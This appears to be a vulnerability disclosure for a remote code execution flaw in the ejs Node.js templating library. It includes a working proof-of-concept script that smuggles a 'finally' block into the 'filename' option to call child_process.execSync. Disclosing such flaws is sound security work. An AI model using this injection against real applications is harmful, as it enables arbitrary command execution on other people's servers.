# Description

Remote Code Execution (RCE) in ejs

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
let ejs = require('ejs')
ejs.render('./views/test.ejs',{
    filename:'/etc/passwd\nfinally { this.global.process.mainModule.require(\'child_process\').execSync(\'touch HACKED\') }',
    compileDebug: true,
    message: 'test',
    client: true
})
```

2. Execute the following commands in terminal:

```
npm i ejs # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
